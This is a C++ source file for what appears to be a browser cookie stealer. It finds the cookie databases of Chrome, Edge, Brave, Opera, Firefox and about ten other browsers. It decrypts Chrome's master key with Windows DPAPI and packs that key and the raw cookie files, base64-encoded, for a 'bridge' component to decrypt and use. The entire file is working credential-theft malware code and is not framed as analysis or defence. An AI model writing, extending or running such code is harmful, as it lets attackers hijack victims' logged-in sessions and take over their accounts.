#include "cookie_grabber.h"
#include <shlobj.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <algorithm>
#include <dpapi.h>
#include <wincrypt.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

// Base64 decode
static std::vector<unsigned char> Base64Decode(const std::string& input) {
    DWORD needed = 0;
    CryptStringToBinaryA(input.c_str(), (DWORD)input.length(), CRYPT_STRING_BASE64, NULL, &needed, NULL, NULL);
    if (needed == 0) return {};
    std::vector<unsigned char> result(needed);
    CryptStringToBinaryA(input.c_str(), (DWORD)input.length(), CRYPT_STRING_BASE64, result.data(), &needed, NULL, NULL);
    return result;
}

// Base64 encode binary data
static std::string Base64Encode(const std::vector<unsigned char>& data) {
    DWORD needed = 0;
    CryptBinaryToStringA(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &needed);
    if (needed == 0) return {};
    std::string result(needed, '\0');
    CryptBinaryToStringA(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &needed);
    result.resize(needed > 0 ? needed - 1 : 0);
    return result;
}

// Read entire file into a vector of bytes
static std::vector<unsigned char> ReadFileBytes(const std::string& path) {
    std::vector<unsigned char> result;
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return result;
    
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    result.resize((size_t)size);
    file.read((char*)result.data(), size);
    return result;
}

// Check if a file exists
static bool FileExists(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}

// Get the first matching profile directory for a browser
static std::string GetProfileDir(const std::string& basePath) {
    WIN32_FIND_DATAA findData;
    std::string pattern = basePath + "\\*.default*";
    HANDLE hFind = FindFirstFileA(pattern.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        std::string result = basePath + "\\" + findData.cFileName;
        FindClose(hFind);
        return result;
    }
    return "";
}

// Extract the encrypted_key from Local State JSON and decrypt it with DPAPI
static std::vector<unsigned char> DecryptChromeKey(const std::vector<unsigned char>& localStateData) {
    std::string ls((const char*)localStateData.data(), localStateData.size());
    
    // Find "encrypted_key":" (Chrome 80+)
    const std::string keyMarker = "\"encrypted_key\":\"";
    size_t pos = ls.find(keyMarker);
    if (pos == std::string::npos) return {};
    
    pos += keyMarker.length();
    size_t endPos = ls.find("\"", pos);
    if (endPos == std::string::npos) return {};
    
    std::string b64Key = ls.substr(pos, endPos - pos);
    
    // Base64 decode
    std::vector<unsigned char> decoded = Base64Decode(b64Key);
    if (decoded.size() < 5) return {};
    
    // Chrome prepends "DPAPI" (5 bytes) to the encrypted key
    std::vector<unsigned char> encryptedKey(decoded.begin() + 5, decoded.end());
    
    // Decrypt with DPAPI
    DATA_BLOB inBlob = { (DWORD)encryptedKey.size(), encryptedKey.data() };
    DATA_BLOB outBlob = { 0, NULL };
    
    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
        std::vector<unsigned char> result(outBlob.pbData, outBlob.pbData + outBlob.cbData);
        LocalFree(outBlob.pbData);
        return result;
    }
    
    return {};
}

// Grab cookies from a single Chromium-based browser
// Sends decrypted key + raw SQLite DB so the bridge can decrypt individual values
static std::string GrabChromiumCookies(const std::string& browserName,
                                        const std::string& localAppData,
                                        const std::string& profileName) {
    std::string userData = localAppData + "\\" + browserName + "\\User Data";
    std::string localStatePath = userData + "\\Local State";
    std::string cookiesPath = userData + "\\" + profileName + "\\Cookies";
    
    if (!FileExists(cookiesPath)) {
        cookiesPath = userData + "\\" + profileName + "\\Network\\Cookies";
    }
    
    if (!FileExists(localStatePath) || !FileExists(cookiesPath)) {
        return "";
    }
    
    // Read Local State and decrypt the key
    std::vector<unsigned char> localStateData = ReadFileBytes(localStatePath);
    if (localStateData.empty()) return "";
    
    std::vector<unsigned char> decryptedKey = DecryptChromeKey(localStateData);
    
    // Read Cookies SQLite DB
    std::vector<unsigned char> cookiesData = ReadFileBytes(cookiesPath);
    if (cookiesData.empty()) return "";
    
    if (!decryptedKey.empty()) {
        // New format: COOKIE_DECRYPTED|<browser>|<decrypted_key_b64>|<cookies_db_b64>
        // Bridge will use the key to decrypt individual cookie values
        std::string result = "COOKIE_DECRYPTED|";
        result += browserName + "|";
        result += Base64Encode(decryptedKey) + "|";
        result += Base64Encode(cookiesData);
        return result;
    }
    
    // Fall back to old format (no decryption possible)
    std::string result = "COOKIE_DATA|";
    result += browserName + "|";
    result += Base64Encode(localStateData) + "|";
    result += Base64Encode(cookiesData);
    
    return result;
}

// Grab cookies from Firefox
static std::string GrabFirefoxCookies() {
    char appData[MAX_PATH];
    if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
        return "";
    }
    
    std::string mozPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
    std::string profileDir = GetProfileDir(mozPath);
    if (profileDir.empty()) return "";
    
    std::string cookiesPath = profileDir + "\\cookies.sqlite";
    if (!FileExists(cookiesPath)) return "";
    
    std::vector<unsigned char> cookiesData = ReadFileBytes(cookiesPath);
    if (cookiesData.empty()) return "";
    
    std::string result = "COOKIE_DATA|firefox||";
    result += Base64Encode(cookiesData);
    
    return result;
}

std::string GrabAllBrowserCookies() {
    std::string result;
    
    char localAppData[MAX_PATH];
    if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        return "";
    }
    std::string la = std::string(localAppData);
    
    // Chromium browsers
    struct BrowserInfo {
        const char* name;
        const char* folder;
        const char* profile;
    };
    
    BrowserInfo browsers[] = {
        {"chrome",    "Google\\Chrome",                "Default"},
        {"edge",      "Microsoft\\Edge",               "Default"},
        {"brave",     "BraveSoftware\\Brave-Browser",  "Default"},
        {"opera",     "Opera Software\\Opera Stable",  ""},
        {"vivaldi",   "Vivaldi",                       "Default"},
        {"chromium",  "Chromium",                      "Default"},
        {"yandex",    "Yandex\\YandexBrowser",         "Default"},
        {"opera_gx",  "Opera Software\\Opera GX Stable", ""},
        {"slimjet",   "Slimjet",                       "Default"},
        {"iridium",   "Iridium",                       "Default"},
        {"cent",      "CentBrowser",                   "Default"},
        {"coccoc",    "CocCoc\\Browser",               "Default"},
        {"360chrome", "360Chrome\\Chrome",             "Default"},
        {"sogou",     "SogouExplorer",                 "Default"},
    };
    
    for (const auto& b : browsers) {
        std::string data = GrabChromiumCookies(b.folder, la, b.profile);
        if (!data.empty()) {
            if (!result.empty()) result += "\n";
            result += data;
        }
    }
    
    // Firefox
    std::string ffData = GrabFirefoxCookies();
    if (!ffData.empty()) {
        if (!result.empty()) result += "\n";
        result += ffData;
    }
    
    return result;
}
